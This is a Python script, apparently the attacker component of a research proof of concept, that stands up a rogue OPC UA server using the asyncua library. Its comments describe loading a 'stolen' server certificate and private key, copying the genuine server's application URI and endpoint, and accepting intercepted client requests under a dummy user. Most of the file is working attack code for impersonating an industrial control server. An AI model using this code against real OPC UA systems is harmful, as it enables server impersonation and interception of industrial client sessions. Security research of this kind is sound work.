import asyncio
import sys
from pathlib import Path
import socket

import logging

sys.path.insert(0, "venv/kci-session-user-confusion_attacker")
from asyncua import Server
from asyncua import ua
from asyncua.server.user_managers import UserManager, CertificateUserManager
from asyncua.crypto.cert_gen import setup_self_signed_certificate
from asyncua.crypto.validator import CertificateValidator, CertificateValidatorOptions
from cryptography.x509.oid import ExtendedKeyUsageOID
from asyncua.crypto.truststore import TrustStore
from asyncua.crypto.permission_rules import User, UserRole

logging.basicConfig(level=logging.INFO)



async def main():
    # Stolen server's certificate and private key
    cert_base = Path(__file__).parent 
    server_cert = Path(cert_base / "../server/server_cert.der")
    server_private_key = Path(cert_base / "../server/server_key.der")

    server_app_uri = "urn:Teds-MacBook-Pro.local:freeopcua/server"

    # Attacker accepts request no matter the user -> Use a dummy user (2) in this case
    cert_user_manager = CertificateUserManager()
    await cert_user_manager.add_user(Path(cert_base / f"../client/user-certificates/user2-cert.der"), name="user2")
    server = Server(user_manager=cert_user_manager)

    await server.init()

    await server.set_application_uri(server_app_uri) 
    server.set_endpoint("opc.tcp://Teds-MacBook-Pro.local:4842/freeopcua/server/")

    # Security policy type - Works in both sign-only and, sign and encrypt
    server.set_security_policy([ua.SecurityPolicyType.Basic256Sha256_SignAndEncrypt])
    #server.set_security_policy([ua.SecurityPolicyType.Basic256Sha256_Sign])

    # Load server certificate and private key. This enables endpoints with signing and encryption
    await server.load_certificate(str(server_cert))
    await server.load_private_key(str(server_private_key))

    # For accepting client's intercepted requests
    validator = CertificateValidator(
        options=CertificateValidatorOptions.EXT_VALIDATION | CertificateValidatorOptions.PEER_CLIENT)
    server.set_certificate_validator(validator)

    idx = 0

    # Anything here is fine
    myobj = await server.nodes.objects.add_object(idx, "MyObject")
    myvar = await myobj.add_variable(idx, "MyVariable", 0.0)
    await myvar.set_writable()

    # Starting server
    async with server:
        while True:
            await asyncio.sleep(1)
            current_val = await myvar.get_value()
            count = current_val + 0.1
            await myvar.write_value(count)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())